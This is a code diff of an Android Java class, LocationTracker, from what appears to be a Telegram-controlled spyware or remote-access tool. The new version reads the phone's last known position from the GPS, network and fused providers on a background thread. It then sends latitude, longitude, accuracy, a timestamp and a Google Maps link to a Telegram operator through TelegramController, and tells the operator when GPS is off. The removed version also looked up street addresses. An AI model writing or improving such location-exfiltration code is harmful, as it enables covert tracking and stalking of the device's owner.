@@ -4,88 +4,66 @@ import android.content.Context;
 import android.location.Location;
 import android.location.LocationManager;
 import android.os.Build;
-import androidx.core.location.LocationManagerCompat;
-import com.google.android.gms.location.FusedLocationProviderClient;
-import com.google.android.gms.location.LocationServices;
-import com.google.android.gms.tasks.Tasks;
+import android.os.Handler;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Locale;
 
 public class LocationTracker {
 
     public static void sendLocation(Context context) {
-        try {
-            FusedLocationProviderClient fusedClient = 
-                LocationServices.getFusedLocationProviderClient(context);
-            
-            Tasks.await(fusedClient.getLastLocation())
-                .addOnSuccessListener(location -> {
-                    if (location != null) {
-                        TelegramController.sendLocation(context, 
-                            location.getLatitude(), location.getLongitude());
-                        
-                        String address = getAddressFromLocation(context, 
-                            location.getLatitude(), location.getLongitude());
-                        
-                        TelegramController.sendMessage(context, 
-                            "📍 **Location Updated**\nLat: " + location.getLatitude() + 
-                            "\nLon: " + location.getLongitude() + 
-                            "\nAccuracy: " + location.getAccuracy() + "m" +
-                            (address != null ? "\nAddress: " + address : ""));
+        new Thread(() -> {
+            try {
+                LocationManager locationManager = 
+                    (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
+                
+                Location location = null;
+                
+                if (locationManager != null) {
+                    try {
+                        location = locationManager.getLastKnownLocation(
+                            LocationManager.GPS_PROVIDER);
+                    } catch (Exception ignored) {}
+                    
+                    if (location == null) {
+                        try {
+                            location = locationManager.getLastKnownLocation(
+                                LocationManager.NETWORK_PROVIDER);
+                        } catch (Exception ignored) {}
                     }
-                })
-                .addOnFailureListener(e -> {
-                    getLocationFromGPS(context);
-                });
-                
-        } catch (Exception e) {
-            getLocationFromGPS(context);
-        }
-    }
-
-    private static void getLocationFromGPS(Context context) {
-        try {
-            LocationManager locationManager = 
-                (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
-            
-            if (locationManager != null) {
-                Location location = locationManager.getLastKnownLocation(
-                    LocationManager.GPS_PROVIDER);
-                
-                if (location == null) {
-                    location = locationManager.getLastKnownLocation(
-                        LocationManager.NETWORK_PROVIDER);
+                    
+                    if (location == null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                        try {
+                            location = locationManager.getLastKnownLocation(
+                                LocationManager.FUSED_PROVIDER);
+                        } catch (Exception ignored) {}
+                    }
                 }
                 
                 if (location != null) {
-                    TelegramController.sendLocation(context, 
-                        location.getLatitude(), location.getLongitude());
+                    double lat = location.getLatitude();
+                    double lon = location.getLongitude();
+                    
+                    String timestamp = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", 
+                        Locale.getDefault()).format(new Date());
                     
                     TelegramController.sendMessage(context, 
-                        "📍 **Location**\nLat: " + location.getLatitude() + 
-                        "\nLon: " + location.getLongitude());
+                        "📍 **Location Updated**\nLat: " + lat + 
+                        "\nLon: " + lon + 
+                        "\nAccuracy: " + location.getAccuracy() + "m" +
+                        "\nProvider: " + location.getProvider() +
+                        "\nTime: " + timestamp +
+                        "\n\nMap: https://maps.google.com/?q=" + lat + "," + lon);
+                } else {
+                    TelegramController.sendMessage(context, 
+                        "📍 Location not available. Make sure GPS is ON.");
                 }
+                
+            } catch (Exception e) {
+                e.printStackTrace();
+                TelegramController.sendMessage(context, 
+                    "📍 Location error: " + e.getMessage());
             }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-    private static String getAddressFromLocation(Context context, double lat, double lon) {
-        try {
-            android.location.Geocoder geocoder = new android.location.Geocoder(context);
-            java.util.List<android.location.Address> addresses = 
-                geocoder.getFromLocation(lat, lon, 1);
-            
-            if (addresses != null && !addresses.isEmpty()) {
-                android.location.Address address = addresses.get(0);
-                StringBuilder sb = new StringBuilder();
-                for (int i = 0; i <= address.getMaxAddressLineIndex(); i++) {
-                    sb.append(address.getAddressLine(i)).append(", ");
-                }
-                return sb.toString();
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-        return null;
+        }).start();
     }
 }
